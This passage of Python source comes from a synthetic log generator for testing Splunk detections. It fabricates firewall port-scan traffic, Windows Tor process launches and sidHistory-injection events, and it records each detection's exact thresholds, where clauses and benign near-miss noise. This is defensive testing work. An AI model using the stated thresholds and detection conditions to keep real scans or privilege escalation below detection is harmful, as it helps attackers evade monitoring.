                        'src_ip': rng.choice(outsiders), 'dest_ip': rng.choice(servers),
                        'dest_port': port, 'transport': 'tcp', 'verdict': 'blocked', 'probe': True})
                    continue
                port, proto, app = rng.choice(INTERNAL_SERVICES)
                noise_identities.append({
                    'src_ip': rng.choice(clients), 'dest_ip': rng.choice(servers),
                    'dest_port': port, 'transport': proto, 'app': app,
                    'verdict': 'allowed' if rng.random() < 0.95 else 'blocked', 'probe': False})
        return attack_identities, noise_identities


NETWORK_ATTACK_TYPES = {
    # The key is from when this attack was Palo Alto only; saved senders use it.
    'paloalto_horizontal_port_scan': {
        'name': 'Internal Horizontal Port Scan',
        'description': 'One internal host probing the same port on many internal hosts',
        'log_type': 'paloalto',
        'category': 'Network',
        'datamodel': 'Network_Traffic',
        'splunk_research_url': 'https://research.splunk.com/network/1ff9eb9a-7d72-4993-a55e-59a839e607f1/',
        # Every firewall add-on whose traffic reaches Network_Traffic with the
        # five BY fields the detection needs. Zscaler's web proxy is tagged
        # Network_Traffic too, but it sees web requests leaving the network, not
        # hosts probing each other inside it.
        'data_sources': [
            {'log_type': 'paloalto', 'sourcetype': 'pan:traffic',
             'label': 'Palo Alto · traffic', 'formats': ['default']},
            {'log_type': 'fortigate', 'sourcetype': 'fortigate_traffic',
             'label': 'FortiGate · forward traffic', 'formats': ['default']},
            {'log_type': 'cisco_asa', 'sourcetype': 'cisco:asa',
             'label': 'Cisco ASA · access-list decisions (106023, 106100)', 'formats': ['default']},
        ],
        # splunk/security_content detections/network/internal_horizontal_port_scan.yml
        'detection': {
            'name': 'Internal Horizontal Port Scan',
            'id': '1ff9eb9a-7d72-4993-a55e-59a839e607f1',
            'datamodel': 'Network_Traffic.All_Traffic',
            'where': 'src_ip IN ("10.0.0.0/8","172.16.0.0/12","192.168.0.0/16")',
            # tstats drops a row when any of these is null.
            'by': ['src_ip', 'dest_port', 'dest_ip', 'transport', 'rule'],
            'group_by': ['src_ip', 'dest_port', 'transport'],
            'span': '1h',
            'threshold': 250,
            'fields': ['_time', 'action', 'dest_ports', 'dest_zone', 'src_category',
                       'src_ip', 'src_zone', 'totalDestIPCount'],
            'entities': ['src_ip'],
        },
        'defaults': {'events': 250, 'noise_events': 300, 'duration': 60},
        'count_label': 'Number of Distinct Dest IPs',
        'count_hint': 'One probe per destination, shared between the selected '
                      'sourcetypes. The detection fires from 250 within one clock hour.',
        # How the form sets the environment: one scanner, many destinations. A
        # list, because the form keeps this order and JSON objects lose it.
        'identity_fields': [
            {'field': 'src_ip', 'mode': 'single', 'label': 'Source IP'},
            {'field': 'dest_ip', 'mode': 'distinct', 'label': 'Destination IPs'},
        ],
        'ai_fields': {
            'src_ip': {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'ip',
                       'description': 'Compromised internal host running the scan'},
            'dest_ip': {'type': 'either', 'options': [
                           {'type': 'entity', 'entity_type': 'server', 'entity_field': 'ip'},
                           {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'ip'},
                        ],
                        'description': 'Internal hosts swept by the scan'},
        },
        'field_behaviors': {'dest_port': 'fixed'},
        'sample_logs': [
            '<14>Feb 17 10:15:01 pa-fw-01 1,2026/02/17 10:15:01,012345678901234,TRAFFIC,drop,2560,2026/02/17 10:15:01,10.0.1.50,10.0.1.42,0.0.0.0,0.0.0.0,deny-east-west,,,incomplete,vsys1,trust,servers,ethernet1/2,ethernet1/3,siem-forward,2026/02/17 10:15:01,48213,1,49152,445,0,0,0x0,tcp,deny,62,62,0,1,...',
            'date=2026-02-17 time=10:15:01 devname="fgt-dc-core" devid="FG200E4Q16800456" logid="0000000013" type="traffic" subtype="forward" level="warning" vd="root" eventtime=1771319701 srcip=10.0.1.50 srcport=49152 srcintf="port1" srcintfrole="lan" dstip=10.0.1.43 dstport=445 dstintf="port3" dstintfrole="lan" sessionid=48213 proto=6 action="deny" policyid=27 policytype="policy" poluuid="4f1c…" policyname="deny-lan-east-west" service="SMB" ...',
            '<164>Feb 17 10:15:01 asa-dc-01 : %ASA-4-106023: Deny tcp src inside:10.0.1.50/49152 dst servers:10.0.1.44/445 by access-group "inside_access_in" [0x0, 0x0]',
        ],
    },
    'paloalto_vertical_port_scan': {
        'name': 'Internal Vertical Port Scan',
        'description': 'One internal host probing many ports on a single internal host',
        'log_type': 'paloalto',
        'category': 'Network',
        'datamodel': 'Network_Traffic',
        'splunk_research_url': 'https://research.splunk.com/network/40d2dc41-9bbf-421a-a34b-8611271a6770/',
        'data_sources': [
            {'log_type': 'paloalto', 'sourcetype': 'pan:traffic',
             'label': 'Palo Alto · traffic', 'formats': ['default']},
            {'log_type': 'fortigate', 'sourcetype': 'fortigate_traffic',
             'label': 'FortiGate · forward traffic', 'formats': ['default']},
            {'log_type': 'cisco_asa', 'sourcetype': 'cisco:asa',
             'label': 'Cisco ASA · access-list decisions (106023, 106100)', 'formats': ['default']},
        ],
        # splunk/security_content detections/network/internal_vertical_port_scan.yml
        'detection': {
            'name': 'Internal Vertical Port Scan',
            'id': '40d2dc41-9bbf-421a-a34b-8611271a6770',
            'datamodel': 'Network_Traffic.All_Traffic',
            'where': 'src_ip IN ("10.0.0.0/8","172.16.0.0/12","192.168.0.0/16", …)',
            'by': ['src_ip', 'dest_port', 'dest_ip', 'transport', 'rule'],
            'group_by': ['src_ip', 'dest_ip', 'transport'],
            'span': '1h',
            # Both must be met, within one transport, on one destination.
            'total_ports': 500,
            'privileged_ports': 20,
            'fields': ['_time', 'action', 'dest_zone', 'src_category', 'src_zone',
                       'totalDestPortCount', 'privilegedDestPortCount'],
            'entities': ['src_ip', 'dest_ip'],
        },
        'defaults': {'events': 500, 'noise_events': 200, 'duration': 60},
        'count_label': 'Total Destination Ports',
        'count_hint': 'One probe per port, all to the one host over TCP, shared '
                      'between the selected sourcetypes. The detection fires at 500 '
                      'distinct ports.',
        # A second threshold input beside the count: how many ports are privileged.
        'extra_counts': [
            {'key': 'privileged_ports', 'label': 'Privileged Ports (< 1024)', 'default': 20,
             'hint': 'Of the ports above, how many fall below 1024. The detection needs 20.'},
        ],
        # One scanner, one target: both a single Random / A&I / Custom address.
        'identity_fields': [
            {'field': 'src_ip', 'mode': 'asset', 'label': 'Source IP'},
            {'field': 'dest_ip', 'mode': 'asset', 'label': 'Destination IP'},
        ],
        'ai_fields': {
            'src_ip': {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'ip',
                       'description': 'Compromised internal host running the scan'},
            'dest_ip': {'type': 'either', 'options': [
                           {'type': 'entity', 'entity_type': 'server', 'entity_field': 'ip'},
                           {'type': 'entity', 'entity_type': 'endpoint', 'entity_field': 'ip'},
                        ],
                        'description': 'The single internal host being scanned'},
        },
        # No legacy per-field override: src and dest come from the identity rows,
        # and the ports are the scan itself, not a value to pin.
        'field_behaviors': {},
        'sample_logs': [
            '<14>Feb 17 10:20:01 pa-fw-01 1,2026/02/17 10:20:01,012345678901234,TRAFFIC,drop,2560,2026/02/17 10:20:01,10.0.1.50,10.0.2.100,0.0.0.0,0.0.0.0,deny-east-west,,,incomplete,vsys1,trust,servers,ethernet1/2,ethernet1/3,siem-forward,2026/02/17 10:20:01,49200,1,52001,22,0,0,0x0,tcp,deny,62,62,0,1,...',
            'date=2026-02-17 time=10:20:01 devname="fgt-dc-core" devid="FG200E4Q16800456" logid="0000000013" type="traffic" subtype="forward" level="warning" vd="root" eventtime=1771320001 srcip=10.0.1.50 srcport=52002 srcintf="port1" srcintfrole="lan" dstip=10.0.2.100 dstport=445 dstintf="port3" dstintfrole="lan" sessionid=49201 proto=6 action="deny" policyid=27 policytype="policy" poluuid="4f1c…" policyname="deny-lan-east-west" service="SMB" ...',
            '<164>Feb 17 10:20:02 asa-dc-01 : %ASA-4-106023: Deny tcp src inside:10.0.1.50/52003 dst servers:10.0.2.100/3389 by access-group "inside_access_in" [0x0, 0x0]',
        ],
    },
}


# ============================================================================
# Windows attack generators
# ============================================================================

WINDOWS_WORKSTATIONS = [
    'DESKTOP-ABC123', 'DESKTOP-XYZ789', 'DESKTOP-QRS456', 'LAPTOP-DEV01',
    'LAPTOP-MKT02', 'WKS-FIN01', 'WKS-HR02', 'WKS-ENG03', 'WKS-SEC01',
    'DESKTOP-ADMIN1', 'LAPTOP-EXEC1', 'WKS-IT01', 'DESKTOP-LAB01',
]

WINDOWS_DOMAINS = ['CONTOSO', 'CORP', 'LAB', 'PROD', 'WORKGROUP']

WINDOWS_ATTACK_USERS = [
    'jsmith', 'mdoe', 'admin', 'jdoe', 'bwilson', 'agarcia', 'clee',
    'dmartin', 'ejohnson', 'ftaylor', 'sysadmin', 'developer', 'analyst',
]

TOR_PROCESS_VARIANTS = [
    {
        'process_name': 'tor.exe',
        'process_path': 'C:\\Users\\{user}\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe',
        'command_line': '"C:\\Users\\{user}\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe"',
        'parent_process_name': 'firefox.exe',
        'parent_process_path': 'C:\\Users\\{user}\\Desktop\\Tor Browser\\Browser\\firefox.exe',
        'original_file_name': 'tor.exe',
    },
    {
        'process_name': 'tor.exe',
        'process_path': 'C:\\Users\\{user}\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe',
        'command_line': '"C:\\Users\\{user}\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe" --defaults-torrc "C:\\Users\\{user}\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Data\\Tor\\torrc-defaults" -f "C:\\Users\\{user}\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Data\\Tor\\torrc"',
        'parent_process_name': 'firefox.exe',
        'parent_process_path': 'C:\\Users\\{user}\\Desktop\\Tor Browser\\Browser\\firefox.exe',
        'original_file_name': 'tor.exe',
    },
    {
        'process_name': 'tor.exe',
        'process_path': 'C:\\Users\\{user}\\AppData\\Local\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe',
        'command_line': '"C:\\Users\\{user}\\AppData\\Local\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe"',
        'parent_process_name': 'firefox.exe',
        'parent_process_path': 'C:\\Users\\{user}\\AppData\\Local\\Tor Browser\\Browser\\firefox.exe',
        'original_file_name': 'tor.exe',
    },
    {
        'process_name': 'tor.exe',
        'process_path': 'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\tor-{tor_version}\\tor.exe',
        'command_line': '"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\tor-{tor_version}\\tor.exe" --SOCKSPort 9350',
        'parent_process_name': 'brave.exe',
        'parent_process_path': 'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',
        'original_file_name': 'tor.exe',
    },
    {
        'process_name': 'tor.exe',
        'process_path': 'C:\\Users\\{user}\\Downloads\\tor.exe',
        'command_line': 'C:\\Users\\{user}\\Downloads\\tor.exe',
        'parent_process_name': 'cmd.exe',
        'parent_process_path': 'C:\\Windows\\System32\\cmd.exe',
        'original_file_name': 'tor.exe',
    },
    {
        'process_name': 'tor.exe',
        'process_path': 'C:\\Temp\\tor\\tor.exe',
        'command_line': 'C:\\Temp\\tor\\tor.exe --SocksPort 9150 --DataDirectory C:\\Temp\\tor\\data',
        'parent_process_name': 'powershell.exe',
        'parent_process_path': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
        'original_file_name': 'tor.exe',
    },
    {
        # The detection's second branch: Brave's private-window Tor client is not
        # named tor.exe, so only the path gives it away — `\BraveSoftware\Brave-Browser`
        # and `\tor-` together.
        'process_name': 'tor-{tor_version}-win32-brave-2.exe',
        'process_path': 'C:\\Users\\{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\biahpgbdmdkfgndcmfiipgcebobojjkp\\1.0.43\\tor-{tor_version}-win32-brave-2.exe',
        'command_line': '"C:\\Users\\{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\biahpgbdmdkfgndcmfiipgcebobojjkp\\1.0.43\\tor-{tor_version}-win32-brave-2.exe" --ignore-missing-torrc -f nul --defaults-torrc nul',
        'parent_process_name': 'brave.exe',
        'parent_process_path': 'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',
        'original_file_name': 'tor.exe',
    },
]

#: Benign process creations of the same kind, each one a near miss for the
#: detection's `where` clause:
#:     process_name = "tor.exe"
#:     OR (process_path = "*\BraveSoftware\Brave-Browser*" AND process_path = "*\tor-*")
#: They give the analyst — and the rule — something to stand out from.
TOR_NOISE_VARIANTS = [
    {   # Tor Browser's own front end: Tor usage, but the rule keys on tor.exe
        'process_path': 'C:\\Users\\{user}\\Desktop\\Tor Browser\\Browser\\firefox.exe',
        'command_line': '"C:\\Users\\{user}\\Desktop\\Tor Browser\\Browser\\firefox.exe"',
        'parent_process_path': 'C:\\Windows\\explorer.exe',
    },
    {   # Brave without its Tor window: the first half of the second branch only
        'process_path': 'C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe',
        'command_line': '"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" --type=renderer',
        'parent_process_path': 'C:\\Windows\\explorer.exe',
    },
    {   # The Tor Browser installer: `\tor-` in the path, but not under Brave
        'process_path': 'C:\\Users\\{user}\\Downloads\\tor-browser-windows-x86_64-portable-13.5.3.exe',
        'command_line': '"C:\\Users\\{user}\\Downloads\\tor-browser-windows-x86_64-portable-13.5.3.exe"',
        'parent_process_path': 'C:\\Windows\\explorer.exe',
    },
    {   # "tor" inside a longer name
        'process_path': 'C:\\Program Files\\qBittorrent\\qbittorrent.exe',
        'command_line': '"C:\\Program Files\\qBittorrent\\qbittorrent.exe"',
        'parent_process_path': 'C:\\Windows\\explorer.exe',
    },
    {   # An ordinary browser launch
        'process_path': 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
        'command_line': '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --no-startup-window',
        'parent_process_path': 'C:\\Windows\\explorer.exe',
    },
]

TOR_VERSIONS = ['0.4.7.13', '0.4.7.16', '0.4.8.7', '0.4.8.10', '0.4.8.12']

WINDOWS_TOR_FIELD_DEFAULTS = {
    'user': lambda: random.choice(WINDOWS_ATTACK_USERS),
    'dest': lambda: random.choice(WINDOWS_WORKSTATIONS),
}

WINDOWS_ATTACK_TYPES = {
    'windows_tor_client_execution': {
        'name': 'Windows TOR Client Execution',
        'description': 'TOR browser or client execution detected on Windows endpoint (T1090.003)',
        'log_type': 'windows',
        'category': 'Endpoint',
        'datamodel': 'Endpoint',
        'splunk_research_url': 'https://research.splunk.com/endpoint/f164bc6f-ecbe-45e0-aaa6-f5c4d8c84b9a/',
        # Where the attack's events land: one entry per data source it can be sent
        # as. `formats` are that source's render formats; each has its own wire
        # sourcetype and source in ta_registry, which the attack forces.
        'data_sources': [
            {'log_type': 'windows', 'sourcetype': 'WinEventLog:Security',
             'label': 'Windows Security · process creation (4688)',
             'formats': ['xml', 'classic']},
        ],
        # splunk/security_content detections/endpoint/windows_tor_client_execution.yml
        'detection': {
            'name': 'Windows TOR Client Execution',
            'id': 'f164bc6f-ecbe-45e0-aaa6-f5c4d8c84b9a',
            'datamodel': 'Endpoint.Processes',
            'where': 'process_name = "tor.exe" OR (process_path = "*\\BraveSoftware\\Brave-Browser*" '
                     'AND process_path = "*\\tor-*")',
            'fields': ['action', 'dest', 'original_file_name', 'parent_process',
                       'parent_process_exec', 'parent_process_guid', 'parent_process_id',
                       'parent_process_name', 'parent_process_path', 'process',
                       'process_exec', 'process_guid', 'process_hash', 'process_id',
                       'process_integrity_level', 'process_name', 'process_path',
                       'user', 'user_id', 'vendor_product'],
            'entities': ['dest', 'user'],
        },
        'defaults': {'events': 5, 'noise_events': 20, 'duration': 1},
        # The detection's two entities, and the only returned fields an
        # environment actually holds.
        'ai_fields': {
            'user': {'type': 'account', 'account_type': 'standard', 'account_field': 'username',
                     'description': 'User running the Tor client'},
            'dest': {'type': 'entity',  'entity_type': 'endpoint',  'entity_field': 'nt_host',
                     'description': 'Workstation where Tor was executed'},
        },
        # Per event, not per run: each Tor launch — attack or benign — is its own
        # user on their own host, drawn from the environment at the slider's share
        # and from the pools below otherwise. A value typed in the form still pins
        # every event.
        'field_behaviors': {'user': 'rotating', 'dest': 'rotating'},
        'sample_logs': [
            '<Event xmlns=\'http://schemas.microsoft.com/win/2004/08/events/event\'><System><Provider Name=\'Microsoft-Windows-Security-Auditing\' Guid=\'{54849625-5478-4994-A5BA-3E3B0328C30D}\'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\'2026-02-18T10:30:01.0000000Z\'/><EventRecordID>456789</EventRecordID><Channel>Security</Channel><Computer>DESKTOP-ABC123</Computer></System><EventData><Data Name=\'SubjectUserName\'>jsmith</Data><Data Name=\'NewProcessName\'>C:\\Users\\jsmith\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe</Data><Data Name=\'ParentProcessName\'>C:\\Users\\jsmith\\Desktop\\Tor Browser\\Browser\\firefox.exe</Data><Data Name=\'CommandLine\'>"C:\\Users\\jsmith\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe"</Data></EventData></Event>',
        ],
    },
}


class Windows4688Generator(BaseAttackGenerator):
    """A Windows 4688 process creation, in the two shapes Splunk receives it.

    XmlWinEventLog through windows_xml, or the classic WinEventLog text a
    forwarder sends with renderXml = false — `key=value` header lines, then the
    message with `Name:\tvalue` pairs, which is what Splunk's wel-eq-kv /
    wel-col-kv extractions and the TA's `^LogName=` / `^ComputerName=`
    transforms read.

    Shared by every attack whose events are process creations: the shape is
    exact — single-quoted attributes, a seven-digit UTC SystemTime, the fifteen
    fields a 4688 v2 carries — and a second copy of it would drift.
    """

    #: How the classic rendering spells what XML carries as a code.
    TOKEN_ELEVATION = {'%%1936': 'TokenElevationTypeDefault (1)',
                       '%%1937': 'TokenElevationTypeFull (2)',
                       '%%1938': 'TokenElevationTypeLimited (3)'}
    INTEGRITY = {'S-1-16-4096': 'Low', 'S-1-16-8192': 'Medium', 'S-1-16-12288': 'High'}

    def __init__(self, field_behaviors, options=None):
        super().__init__(field_behaviors, options)
        options = options or {}
        self._domain = random.choice(WINDOWS_DOMAINS)
        self.render_format = options.get('render_format') or 'xml'

    def _event(self, *, user, dest, process_path, command_line, parent_process_path):
        """One 4688, with the identifiers a real one carries."""
        return {
            'user': user, 'dest': dest, 'domain': self._domain,
            'user_sid': (f'S-1-5-21-{random.randint(1000000000, 3999999999)}'
                         f'-{random.randint(1000000000, 3999999999)}'
                         f'-{random.randint(1000000000, 3999999999)}-{random.randint(1000, 9999)}'),
            'logon_id': f'0x{random.randint(100000, 999999):x}',
            'new_process_id': f'0x{random.randint(1000, 9999):x}',
            'process_path': process_path,
            'command_line': command_line,
            'parent_process_id': f'0x{random.randint(500, 5000):x}',
            'parent_process_path': parent_process_path,
            'token_elevation': random.choice(list(self.TOKEN_ELEVATION)),
            'integrity_sid': random.choices(list(self.INTEGRITY), weights=[0.1, 0.7, 0.2])[0],
            'record_id': random.randint(100000, 999999),
        }

    def _render(self, event):
        return self._classic(event) if self.render_format == 'classic' else self._xml(event)

    def _xml(self, e):
        event_xml = f'''<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{{54849625-5478-4994-A5BA-3E3B0328C30D}}" />
    <EventID>4688</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>13312</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="{datetime.now().isoformat()}" />
    <EventRecordID>{e['record_id']}</EventRecordID>
    <Correlation />
    <Execution ProcessID="4" ThreadID="{random.randint(1000, 9000)}" />
    <Channel>Security</Channel>
    <Computer>{e['dest']}</Computer>
    <Security />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">{e['user_sid']}</Data>
    <Data Name="SubjectUserName">{e['user']}</Data>
    <Data Name="SubjectDomainName">{e['domain']}</Data>
    <Data Name="SubjectLogonId">{e['logon_id']}</Data>
    <Data Name="NewProcessId">{e['new_process_id']}</Data>
    <Data Name="NewProcessName">{e['process_path']}</Data>
    <Data Name="TokenElevationType">{e['token_elevation']}</Data>
    <Data Name="ProcessId">{e['parent_process_id']}</Data>
    <Data Name="CommandLine">{escape(e['command_line'])}</Data>
    <Data Name="TargetUserSid">S-1-0-0</Data>
    <Data Name="TargetUserName">-</Data>
    <Data Name="TargetDomainName">-</Data>
    <Data Name="TargetLogonId">0x0</Data>
    <Data Name="ParentProcessName">{e['parent_process_path']}</Data>
    <Data Name="MandatoryLabel">{e['integrity_sid']}</Data>
  </EventData>
</Event>'''
        # One line, single-quoted: the form Splunk_TA_windows extracts from.
        return render_windows_xml(event_xml)

    def _classic(self, e):
        timestamp = datetime.now().strftime('%m/%d/%Y %I:%M:%S %p')
        integrity = self.INTEGRITY[e['integrity_sid']]
        return (
            f"{timestamp}\n"
            "LogName=Security\n"
            "EventCode=4688\n"
            "EventType=0\n"
            f"ComputerName={e['dest']}\n"
            "SourceName=Microsoft Windows security auditing.\n"
            "Type=Information\n"
            f"RecordNumber={e['record_id']}\n"
            "Keywords=Audit Success\n"
            "TaskCategory=Process Creation\n"
            "OpCode=Info\n"
            "Message=A new process has been created.\n"
            "\n"
            "Creator Subject:\n"
            f"\tSecurity ID:\t\t{e['domain']}\\{e['user']}\n"
            f"\tAccount Name:\t\t{e['user']}\n"
            f"\tAccount Domain:\t\t{e['domain']}\n"
            f"\tLogon ID:\t\t{e['logon_id'].upper().replace('0X', '0x')}\n"
            "\n"
            "Target Subject:\n"
            "\tSecurity ID:\t\tNULL SID\n"
            "\tAccount Name:\t\t-\n"
            "\tAccount Domain:\t\t-\n"
            "\tLogon ID:\t\t0x0\n"
            "\n"
            "Process Information:\n"
            f"\tNew Process ID:\t\t{e['new_process_id']}\n"
            f"\tNew Process Name:\t{e['process_path']}\n"
            f"\tToken Elevation Type:\t{self.TOKEN_ELEVATION[e['token_elevation']]}\n"
            f"\tMandatory Label:\t\tMandatory Label\\{integrity} Mandatory Level\n"
            f"\tCreator Process ID:\t{e['parent_process_id']}\n"
            f"\tCreator Process Name:\t{e['parent_process_path']}\n"
            f"\tProcess Command Line:\t{e['command_line']}\n"
            "\n"
            "Token Elevation Type indicates the type of token that was assigned to the new "
            "process in accordance with User Account Control policy."
        )


class WindowsTorClientGenerator(Windows4688Generator):
    """TOR client executions, and benign process creations of the same kind."""

    FIELD_DEFAULTS = WINDOWS_TOR_FIELD_DEFAULTS

    def generate(self) -> str:
        """One TOR client execution — matched by the detection."""
        self.event_count += 1
        return self._process_creation(random.choice(TOR_PROCESS_VARIANTS))

    def generate_noise(self) -> str:
        """One benign process creation of the same kind — not matched."""
        return self._process_creation(random.choice(TOR_NOISE_VARIANTS))

    def _process_creation(self, variant):
        user = self._get_field_value('user')
        tor_version = random.choice(TOR_VERSIONS)
        fill = lambda text: text.format(user=user, tor_version=tor_version)
        return self._render(self._event(
            user=user, dest=self._get_field_value('dest'),
            process_path=fill(variant['process_path']),
            command_line=fill(variant['command_line']),
            parent_process_path=fill(variant['parent_process_path'])))


# ============================================================================
# Active Directory attack generators
# ============================================================================

#: Domain controllers a change like this is logged on.
AD_DOMAIN_CONTROLLERS = ['DC01', 'DC02', 'DC-CORP-01', 'DC-HQ-02', 'ADDS-DC1']

#: Accounts that hold the rights to edit another account's sidHistory.
AD_ADMIN_USERS = ['administrator', 'svc_adsync', 'j.admin', 'adm_dupont', 'da_backup']

#: Accounts whose sidHistory an attacker plants a privileged SID in.
AD_TARGET_USERS = ['jsmith', 'mdoe', 'c.leroy', 'svc_report', 'temp.contractor', 'helpdesk1']

AD_TARGET_COMPUTERS = ['WKS-FIN01$', 'WKS-HR02$', 'SRV-FILE01$', 'WKS-ENG03$']

#: Well-known RIDs of the privileged principals worth stealing, with what they are.
PRIVILEGED_RIDS = [
    (512, 'Domain Admins'), (519, 'Enterprise Admins'), (518, 'Schema Admins'),
    (500, 'Administrator'), (516, 'Domain Controllers'),
]

#: The values Windows writes in SidHistory when nothing was added — the two the
#: detection excludes by name.
SID_HISTORY_UNSET = ['%%1793', '-']

#: Account-management events of the same family the detection does not look at.
AD_OTHER_EVENT_CODES = [
    (4720, 'A user account was created', 'User Account Management'),
    (4724, 'An attempt was made to reset an account password', 'User Account Management'),
    (4725, 'A user account was disabled', 'User Account Management'),
    (4726, 'A user account was deleted', 'User Account Management'),
]

AD_EVENT_TITLES = {
    4738: ('A user account was changed', 'User Account Management'),
    4742: ('A computer account was changed', 'Computer Account Management'),
}


#: The SID the attack plants unless another is given. Fixed on purpose: the
#: reader copies it into an Enterprise Security identities lookup once, and every
#: run after that matches. RID 512 is Domain Admins, so "privileged" is no lie.
PRIVILEGED_SID_DEFAULT = 'S-1-5-21-1004336348-1177238915-682003330-512'

_SID = re.compile(r'^S-1-\d+(?:-\d+)+$')


def as_sid(value):
    """`value` if it is shaped like a Windows SID, else None."""
    text = str(value or '').strip()
    return text if _SID.match(text) else None


def random_domain_sid(rng=random):
    return (f'S-1-5-21-{rng.randint(1000000000, 3999999999)}'
            f'-{rng.randint(1000000000, 3999999999)}'
            f'-{rng.randint(1000000000, 3999999999)}')


def random_privileged_sid(rng=random):
    """A privileged principal's SID, the kind worth planting in a sidHistory."""
    rid, _name = rng.choice(PRIVILEGED_RIDS)
    return f'{random_domain_sid(rng)}-{rid}'


class WindowsSidHistoryGenerator(BaseAttackGenerator):
    """4738 / 4742 adding a privileged SID to an account's sidHistory (T1134.005).

    This detection is not a datamodel search: it reads the Windows Security log
    through the `wineventlog_security` macro, keeps EventCode 4738 or 4742 whose
    `SidHistory` is neither `%%1793` nor `-`, and then asks Enterprise Security
    whether that SID belongs to a privileged identity.

    Two consequences the generator has to respect:

    * `SidHistory` reaches Splunk only in the XML rendering. It has no extraction
      of its own anywhere in Splunk_TA_windows — the XML events get it from the
      generic `<Data Name='SidHistory'>` block extraction, spelled exactly as the
      detection reads it. The classic rendering carries the same value under the
      message label `SID History:`, which Splunk's wel-col-kv turns into
      `SID_History`, and nothing aliases that back. So the classic format is a
      faithful event that this particular detection cannot match.
    * The last step is a lookup in `identity_lookup_expanded`, which no generator
      can write. So the SID is fixed by default rather than random: the warning
      hands the reader that exact value, one row in an identities lookup makes
      every run match, and anyone who already maintains identities there can put
      one of their own SIDs in the field instead.
    """

    FIELD_DEFAULTS = {}

    #: Share of the attack's events written as a user account change; the rest
    #: are 4742, which the add-on maps less completely (see the tests).
    USER_ACCOUNT_SHARE = 0.8

    def __init__(self, field_behaviors, options=None):
        super().__init__(field_behaviors, options)
        options = options or {}
        self.render_format = options.get('render_format') or 'xml'
        self._domain = random.choice(WINDOWS_DOMAINS)
        self._domain_sid = random_domain_sid()

    # ── planning ────────────────────────────────────────────────────────────

    @classmethod
    def plan_identities(cls, definition, options, attacks, noise, environment, rng=random):
        """(attack identities, noise identities), each event decided once.

        `host`, `dest`, `src_user` and the planted SID are one value for the run,
        each Random, taken from Assets & Identities, or typed. `host` left on
        Random follows `dest`: the change is logged on the domain controller that
        made it, so the two name one machine unless the reader says otherwise.

        The noise is the same account management without the finding: changes
        whose `SidHistory` is one of the two values the detection excludes, and
        neighbouring event codes it never looks at.
        """
        values = (environment or {}).get('values') or {}
        identity = options.get('attack_identity')
        identity = identity if isinstance(identity, dict) else {}

        def choice(field):
            value = identity.get(field)
            return value if isinstance(value, dict) else {}

        dest = _single_value(choice('dest'), 'dest', values,
                             lambda r: r.choice(AD_DOMAIN_CONTROLLERS), rng)
        host_choice = choice('host')
        # The domain controller logs its own change: one machine, two field names.
        host = (dest if not host_choice.get('mode') or host_choice.get('mode') == 'random'
                else _single_value(host_choice, 'host', values,
                                   lambda r: r.choice(AD_DOMAIN_CONTROLLERS), rng))
        src_user = _single_value(choice('src_user'), 'src_user', values,
                                 lambda r: r.choice(AD_ADMIN_USERS), rng)
        # The privileged principal whose SID is planted — a group like Domain
        # Admins, not the account doing the planting. It is what the detection
        # looks up in Enterprise Security, so it is the value the form carries
        # and the warning tells the reader to register there.
        privileged_sid = (as_sid(choice('sid_history').get('value'))
                          or PRIVILEGED_SID_DEFAULT)

        def event(**extra):
            return {'host': host, 'dest': dest, 'src_user': src_user,
                    'privileged_sid': privileged_sid, **extra}

        attack_identities = []
        for _ in range(attacks):
            user_account = rng.random() < cls.USER_ACCOUNT_SHARE
            attack_identities.append(event(
                event_code=4738 if user_account else 4742,
                user=(rng.choice(AD_TARGET_USERS) if user_account
                      else rng.choice(AD_TARGET_COMPUTERS)),
                # The detection's rex accepts the bare SID and the %{…} form, so
                # both are what Windows is known to write.
                sid_history=(privileged_sid if rng.random() < 0.7
                             else '%{' + privileged_sid + '}')))

        noise_identities = []
        for _ in range(noise):
            if rng.random() < 0.6:
                user_account = rng.random() < cls.USER_ACCOUNT_SHARE
                noise_identities.append(event(
                    event_code=4738 if user_account else 4742,
                    user=(rng.choice(AD_TARGET_USERS) if user_account
                          else rng.choice(AD_TARGET_COMPUTERS)),
                    sid_history=rng.choice(SID_HISTORY_UNSET)))
            else:
                code, _title, _task = rng.choice(AD_OTHER_EVENT_CODES)
                noise_identities.append(event(
                    event_code=code, user=rng.choice(AD_TARGET_USERS), sid_history=None))
        return attack_identities, noise_identities

    # ── rendering ───────────────────────────────────────────────────────────

    def generate(self) -> str:
        self.event_count += 1
        return self._render(self._identity)

    def generate_noise(self) -> str:
        return self._render(self._identity)

    def _render(self, event):
        event = {**self._standalone(), **(event or {})}
